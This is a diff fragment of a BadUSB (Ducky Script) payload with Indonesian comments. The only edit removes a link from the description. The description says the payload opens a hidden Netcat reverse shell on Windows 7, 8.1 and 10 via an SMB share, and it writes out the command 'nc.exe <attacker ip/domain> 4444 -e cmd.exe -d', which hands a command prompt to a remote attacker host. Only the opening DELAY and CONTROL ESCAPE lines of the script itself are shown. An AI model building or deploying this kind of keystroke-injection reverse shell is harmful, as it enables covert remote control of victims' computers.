@@ -1,7 +1,7 @@
 REM Title: Netcat Reverse shell untuk Windows 7, Windows 8.1 & Windows 10 dengan pemanfaatan penggunaan share smb di komputer pentester  
 REM Author : Kurniawan. trainingxcode@gmail.com. xcode.or.id
 REM Version : 1.0
-REM Description : Payload ini dirancang khusus oleh Kurniawan untuk BadUSB Super X-code 2.0 ( http://xcode.or.id/usbsuperxcode2 ), payload ini menggunakan gabungan perintah universal, seperti penggunaan CONTROL ESCAPE tapi juga untuk keluar dari cmd menggunakan ALT SPACE dan STRING C sehingga kompatibel dengan banyak windows (Windows 7, 8.1 dan 10), selain itu juga netcat berjalan secara tersembunyi dengan perintah nc.exe (ip publik / domain / subdomain) 4444 -e cmd.exe -d. Kelebihan penggunaan netcat dibandingkan menggunakan backdoor lain adalah netcat menerima domain / sub domain saat netcat melakukan koneksi ke komputer kita / pentester. 
+REM Description : Payload ini dirancang khusus oleh Kurniawan untuk BadUSB Super X-code 2.0, payload ini menggunakan gabungan perintah universal, seperti penggunaan CONTROL ESCAPE tapi juga untuk keluar dari cmd menggunakan ALT SPACE dan STRING C sehingga kompatibel dengan banyak windows (Windows 7, 8.1 dan 10), selain itu juga netcat berjalan secara tersembunyi dengan perintah nc.exe (ip publik / domain / subdomain) 4444 -e cmd.exe -d. Kelebihan penggunaan netcat dibandingkan menggunakan backdoor lain adalah netcat menerima domain / sub domain saat netcat melakukan koneksi ke komputer kita / pentester. 
 DELAY 1000
 CONTROL ESCAPE
 DELAY 1000
